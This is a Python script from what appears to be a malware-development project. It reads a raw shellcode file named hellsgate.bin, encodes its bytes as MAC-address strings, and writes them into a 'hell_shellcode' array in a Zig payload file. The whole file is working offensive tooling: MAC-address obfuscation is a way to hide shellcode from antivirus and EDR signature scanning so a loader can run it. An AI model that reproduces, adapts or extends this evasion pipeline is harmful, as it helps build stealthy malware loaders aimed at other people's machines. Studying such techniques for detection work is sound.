#!/usr/bin/env python3
"""
Script to obfuscate binary data as MAC addresses and update Zig file
"""

import os
import sys


def mac_obfuscation(mac_bytes):
    """
    Convert raw bytes to MAC address format strings.

    Args:
        mac_bytes: bytes representing binary data

    Returns:
        list: List of MAC address strings in format "AA:BB:CC:DD:EE:FF"
    """
    # Pad bytes to make length divisible by 6
    padding_needed = (6 - (len(mac_bytes) % 6)) % 6
    if padding_needed > 0:
        mac_bytes += b"\x00" * padding_needed

    mac_addresses = []

    # Process each 6-byte group as a MAC address
    for i in range(0, len(mac_bytes), 6):
        mac_group = mac_bytes[i: i + 6]

        # Convert each byte to uppercase hex and join with colons
        mac_string = ":".join(f"{byte:02X}" for byte in mac_group)
        mac_addresses.append(mac_string)

    return mac_addresses


def read_binary_file(filename):
    """
    Read binary file and return its contents.

    Args:
        filename: Path to the binary file

    Returns:
        bytes: File contents
    """
    try:
        with open(filename, "rb") as f:
            return f.read()
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading file '{filename}': {e}")
        sys.exit(1)


def update_zig_file(filename, mac_addresses):
    """
    Update the Zig file with obfuscated MAC addresses.

    Args:
        filename: Path to the Zig file
        mac_addresses: List of MAC address strings
    """
    try:
        # Read the existing file
        with open(filename, "r") as f:
            content = f.read()

        # Find the position after "const std = @import("std");"
        std_import = 'const std = @import("std");'
        std_pos = content.find(std_import)

        if std_pos == -1:
            print(
                f"Error: Could not find 'const std = @import(\"std\");' in {
                    filename}"
            )
            sys.exit(1)

        # Find the hell_shellcode array
        start_marker = "pub const hell_shellcode = [_][]const u8{"
        end_marker = "};"

        start_pos = content.find(start_marker)
        if start_pos == -1:
            print(
                f"Error: Could not find 'pub const hell_shellcode = [_][]const u8{{' in {
                    filename}"
            )
            sys.exit(1)

        # Find the end of the array
        brace_pos = start_pos + len(start_marker)
        end_pos = content.find(end_marker, brace_pos)

        if end_pos == -1:
            print(
                f"Error: Could not find closing '}}' for hell_shellcode array in {
                    filename}"
            )
            sys.exit(1)

        # Generate the MAC address array content
        mac_array_content = []
        for mac in mac_addresses:
            mac_array_content.append(f'    "{mac}"')

        # Join with commas and newlines
        mac_array_str = ",\n".join(mac_array_content)

        # If we have content, add newlines for formatting
        if mac_array_str:
            mac_array_str = "\n" + mac_array_str + "\n"

        # Replace the content between the braces
        new_content = content[:brace_pos] + mac_array_str + content[end_pos:]

        # Write the updated content back to the file
        with open(filename, "w") as f:
            f.write(new_content)

        print(
            f"Successfully updated {filename} with {
                len(mac_addresses)} MAC addresses"
        )

    except FileNotFoundError:
        print(f"Error: File '{filename}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"Error updating file '{filename}': {e}")
        sys.exit(1)


def main():
    """Main function"""
    # File paths
    hellsgate_shellcode = "./hellsgate.bin"
    zig_file = "./payloads.zig"

    print(f"Reading binary file: {hellsgate_shellcode}")

    # Read the binary file
    binary_data = read_binary_file(hellsgate_shellcode)
    print(f"Read {len(binary_data)} bytes from {hellsgate_shellcode}")

    # Obfuscate the binary data as MAC addresses
    print("Obfuscating binary data as MAC addresses...")
    mac_addresses = mac_obfuscation(binary_data)
    print(f"Generated {len(mac_addresses)} MAC addresses")

    # Update the Zig file
    print(f"Updating Zig file: {zig_file}")
    update_zig_file(zig_file, mac_addresses)

    print("Obfuscation and file update completed successfully!")

    # Show first few MAC addresses as preview
    if mac_addresses:
        print("\nFirst few MAC addresses:")
        for i, mac in enumerate(mac_addresses[:5]):
            print(f"  {i+1}: {mac}")
        if len(mac_addresses) > 5:
            print(f"  ... and {len(mac_addresses) - 5} more")


if __name__ == "__main__":
    main()
